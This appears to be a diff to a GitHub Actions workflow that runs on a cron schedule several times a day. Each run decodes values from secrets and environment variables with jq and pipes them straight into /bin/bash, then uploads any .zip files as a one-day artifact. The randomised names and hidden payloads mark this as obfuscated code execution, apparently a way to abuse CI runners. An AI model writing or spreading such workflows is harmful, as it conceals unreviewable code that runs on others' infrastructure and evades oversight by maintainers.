@@ -1,26 +1,27 @@
 name: materialfirebase55
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '9 4/6 * * *'
+    - cron: '2 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: materialfirebase55
         env:
-          ha8: ${{ secrets.ha8 }}
+          w958: ${{ secrets.w958 }}
         run: |
-          echo $ha8 | jq -r .vbh51 | /bin/bash
-          echo $pi45 | jq -r .qd9 | /bin/bash
-          echo $ge346 | jq -r .ip1340 | /bin/bash
-          echo $w46129 | jq -r .ctert9438 | /bin/bash
-          echo $sncmi9 | jq -r .y8670 | /bin/bash
-          echo $xhytu4223 | jq -r .mgat930 | /bin/bash
-          echo $xg4931 | jq -r .o3 | /bin/bash
-          echo $osopr433 | jq -r .yb18423 | /bin/bash
-          echo $kb73888 | jq -r .idbs8246 | /bin/bash
+          printf '%s' "$w958" | jq -r .a08 | /bin/bash
+          printf '%s' "$yxkdt17" | jq -r .mlbvh5890 | /bin/bash
+          printf '%s' "$wocb078" | jq -r .xa09015 | /bin/bash
+          printf '%s' "$ywo862" | jq -r .f0581 | /bin/bash
+          echo $iku6299 | jq -r .drid4 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: rmz8Wzh7
+          path: "*.zip"
+          retention-days: 1
